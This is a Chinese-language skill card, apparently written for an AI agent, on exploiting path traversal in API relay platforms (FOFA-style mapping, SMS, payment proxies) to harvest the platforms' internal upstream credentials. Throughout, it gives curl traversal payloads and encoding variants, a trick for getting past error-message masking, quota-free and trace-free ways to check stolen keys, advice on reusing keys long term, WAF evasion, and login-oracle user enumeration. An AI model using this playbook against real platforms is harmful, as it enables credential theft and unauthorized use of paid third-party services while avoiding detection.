---
name: api-aggregator-upstream-cred-traversal
description: >-
  Use when 目标是 API 中转/聚合平台（FOFA/测绘/短信/支付代理）：用户可控 host 被拼进上游请求 URL，
  路径遍历就能读上游账号接口或让错误模板回显内部凭证。含三级遍历、遮蔽后换通道、凭证池验证不耗配额。
---

# API 中转平台：上游凭证遍历收割

实战来源：某测绘 API 平台（2026-10 复测 190+ 次稳定触发），原洞是「遍历 + 错误回显凭证」，复测发现回显被遮蔽但**遍历本体未修**，改走上游账号信息接口直读未遮蔽字段。

## When to Use

- 目标提供「代理查询」：`/api/v1/host/{host}`、`/api/v1/whois/{domain}`、`/api/v1/sms/{phone}`
- 平台自身维护一组**上游官方凭证**（FOFA key、设备云 token、短信通道账号），代表用户去调上游
- 你发现错误消息里出现 `https://upstream.com/...?key=...` 之类拼接痕迹

## 根因

`host` 参数被直接拼进上游 URL：

```
https://fofa.info/api/v1/host/{host}?key=<平台内部凭证>
```

没有 `urlencode`、没有路径规范化 → `..%2F` 系列能改写上游请求路径，打到上游**别的接口**。

## 打法

### 1. 确认可注入（先看错误模板）

```bash
curl -s 'https://目标/api/v1/host/test?token=<你的平台key>'
curl -s 'https://目标/api/v1/host/..%2F..%2Fapi%2Fv1%2Fsearch%2Fmy?token=<你的平台key>'
```

- 若第二条报错里出现上游 URL / 上游返回体 → 命中
- 编码变体轮换：`..%2F`、`%2e%2e%2f`、`..%252F`、`..%5C`、`....//`

### 2. 遮蔽后换通道（关键技巧）

平台给错误消息加打码后，**别硬刚错误模板**，改打「上游正常 200 接口」：

```
GET /api/v1/host/..%2F..%2Fapi%2Fv1%2Fsearch%2Fmy?...
```

上游对合法路径返回**正常 JSON**（账号信息：邮箱、套餐、剩余额度、key 尾号），平台原样透传 → 遮蔽层根本没参与。

思路推广：任何一个你想读的上游接口 `/up/A/B`，都把 `host` 写成 `..%2F..%2Fup%2FA%2FB`。三级不够就四级。

### 3. 凭证回收与验真（不耗配额）

- 从上游账号接口拿到 key / 尾号后，用**只读、零配额**接口验：

```bash
curl -s 'https://fofa.info/api/v1/info/my?key=<候选key>'
curl -s -X POST 'https://upstream/api/status' -d 'key=<候选key>'
```

- 别用 search 接口验（烧配额、留痕）；`info/my` 类接口只回账号信息
- 平台凭证池**通常不轮换**：复测时原 key 全部还能登平台 → 回收一次可长期用

### 4. 顺带的三个面

| 面 | 手法 |
|---|---|
| 登录 oracle | `POST /login` 对存在/不存在账号返回不同错误 → 枚举平台用户 |
| JWT 明文 | 登录拿到的 JWT payload 里直接带上游凭证或内部字段（base64 解一下） |
| 凭证库不同步 | 平台存的 key 与上游官方状态不一致 → 有的已欠费/封禁，逐一验真再用 |

## 判据门槛

- **L1**：遍历请求返回与正常请求**结构不同**（不是 404 页）
- **L2**：返回体含上游字段（邮箱/额度/key 尾号）
- **L3**：回收的 key 能直连上游官方接口返回账号信息

## 坑

1. 目标可能对 `..` 做 WAF 拦截 → 换 `%2e%2e/`、`..;/`、双重编码
2. 上游接口路径猜错会 404，但**错误页也可能带内部信息**（版本、内网地址）
3. 别用 search/查询类接口验证凭证（消耗配额 + 触发风控）
4. 有些平台把上游 key 放在 `Authorization` 头而非 query → 错误模板里看不到，改从 `X-Debug`/`trace` 头找

## 相关卡

- `api-contract-mining` — 先摸清契约再构造遍历
- `ssrf-verification-and-escalation` — 同族「服务端替你发请求」
- `object-storage-credential-oracle` — 拿到云 key 后的存在性判定
